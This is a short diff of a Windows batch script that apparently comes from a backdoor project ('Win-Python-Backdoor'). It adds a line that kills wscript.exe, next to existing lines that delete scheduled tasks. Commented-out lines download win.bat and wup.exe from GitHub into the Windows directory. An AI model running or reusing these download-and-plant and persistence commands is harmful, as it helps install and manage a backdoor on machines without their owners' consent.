@@ -43,6 +43,7 @@ rem %windir%\System32\cmd.exe /c powershell -Command (new-object System.Net.WebC
 rem wget --no-check-certificate https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/win.bat  -O %windir%\win.bat
 rem wget --no-check-certificate %urlgit%/wup.exe  -O %windir%\wup.exe
 taskkill /f /im woffice.exe
+taskkill /f /im wscript.exe
 schtasks /delete /tn sys /F
 schtasks /delete /tn syskill /F
 schtasks /delete /tn office_get /F
